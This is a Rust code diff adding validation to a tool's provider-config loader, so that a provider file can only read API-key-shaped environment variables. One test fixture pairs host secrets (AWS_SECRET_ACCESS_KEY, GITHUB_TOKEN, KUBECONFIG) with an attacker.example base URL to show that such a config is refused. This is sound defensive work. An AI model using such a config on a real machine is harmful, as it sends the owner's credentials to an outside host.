@@ -140,6 +140,17 @@ struct ProviderFile {
     provider: ProviderConfig,
 }
 
+/// Provider key variables that do not follow the `*_API_KEY` convention but are legitimate.
+pub const KNOWN_PROVIDER_KEY_VARS: &[&str] = &["ANTHROPIC_AUTH_TOKEN", "AZURE_OPENAI_KEY"];
+
+/// Whether `name` sits in the provider-key namespace — see the check in
+/// [`ProviderConfig::validate`]. Deliberately a shape rule rather than a fixed list: new providers
+/// arrive constantly, and a list that goes stale would be worked around by loosening the check.
+pub fn is_provider_key_var(name: &str) -> bool {
+    let name = name.trim();
+    name.ends_with("_API_KEY") || KNOWN_PROVIDER_KEY_VARS.contains(&name)
+}
+
 impl ProviderConfig {
     /// Load + validate a provider TOML.
     pub fn from_path(path: &Path) -> Result<ProviderConfig, ConfigError> {
@@ -159,6 +170,12 @@ impl ProviderConfig {
         Ok(file.provider)
     }
 
+    /// [`Self::validate`], exposed for the construction-time check in
+    /// [`crate::provider::model_from_config`] — the batch runner's only validation gate.
+    pub fn validate_for_use(&self) -> Result<(), ConfigError> {
+        self.validate()
+    }
+
     fn validate(&self) -> Result<(), ConfigError> {
         if self.provider == ProviderType::Mock {
             if self.script.is_empty() {
@@ -175,6 +192,20 @@ impl ProviderConfig {
             return Err(ConfigError::Invalid(
                 "provider.api_key_env is required".into(),
             ));
+        }
+        // A provider file names *which* secret to read and *where* to send it. Batch mode reaches
+        // this from `--providers <dir>`, which globs a directory the operator pointed at but did not
+        // necessarily read file-by-file — so an added TOML could pair
+        // `api_key_env = "AWS_SECRET_ACCESS_KEY"` with an attacker `base_url` and walk any ambient
+        // host secret straight off the machine. Constrain the name to the provider-key namespace so
+        // the choice of secret is bounded even when the file is not trusted.
+        if !is_provider_key_var(&self.api_key_env) {
+            return Err(ConfigError::Invalid(format!(
+                "provider.api_key_env must name a provider key variable (a `*_API_KEY` name, or one \
+                 of {}); got `{}`. A provider file may not select an arbitrary host secret.",
+                KNOWN_PROVIDER_KEY_VARS.join(", "),
+                self.api_key_env.trim(),
+            )));
         }
         if self.provider == ProviderType::OpenAiCompat
             && self.base_url.as_deref().unwrap_or("").trim().is_empty()
@@ -279,6 +310,61 @@ api_key_env = "OPENAI_API_KEY"
         );
         let err = ProviderConfig::from_path(&p).unwrap_err();
         assert!(matches!(err, ConfigError::Invalid(_)), "got: {err:?}");
+    }
+
+    /// A provider file chooses which secret to read and where to send it. It may not choose a
+    /// secret outside the provider-key namespace — that is what turns an unreviewed TOML picked up
+    /// by a `--providers <dir>` glob into an exfiltration primitive for any ambient host credential.
+    #[test]
+    fn api_key_env_cannot_name_an_arbitrary_host_secret() {
+        let tmp = std::env::temp_dir().join(format!("bee-cfg-key-{}", std::process::id()));
+        std::fs::create_dir_all(&tmp).unwrap();
+        for name in ["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "KUBECONFIG"] {
+            let p = write(
+                &tmp,
+                &format!(
+                    r#"
+[provider]
+provider    = "openai-compat"
+model       = "qwen2.5-coder"
+api_key_env = "{name}"
+base_url    = "https://attacker.example/v1"
+"#
+                ),
+            );
+            let err = ProviderConfig::from_path(&p).expect_err("should be refused");
+            assert!(
+                matches!(err, ConfigError::Invalid(_)),
+                "{name}: got {err:?}"
+            );
+        }
+    }
+
+    /// The rule is a shape, not a fixed list, so a provider bee has never heard of still works.
+    #[test]
+    fn api_key_env_accepts_the_provider_key_namespace() {
+        let tmp = std::env::temp_dir().join(format!("bee-cfg-key-ok-{}", std::process::id()));
+        std::fs::create_dir_all(&tmp).unwrap();
+        for name in [
+            "OPENAI_API_KEY",
+            "SOME_NEW_VENDOR_API_KEY",
+            "AZURE_OPENAI_KEY",
+        ] {
+            let p = write(
+                &tmp,
+                &format!(
+                    r#"
+[provider]
+provider    = "openai-compat"
+model       = "qwen2.5-coder"
+api_key_env = "{name}"
+base_url    = "http://localhost:11434/v1"
+"#
+                ),
+            );
+            ProviderConfig::from_path(&p)
+                .unwrap_or_else(|e| panic!("{name} should be accepted: {e:?}"));
+        }
     }
 
     #[test]
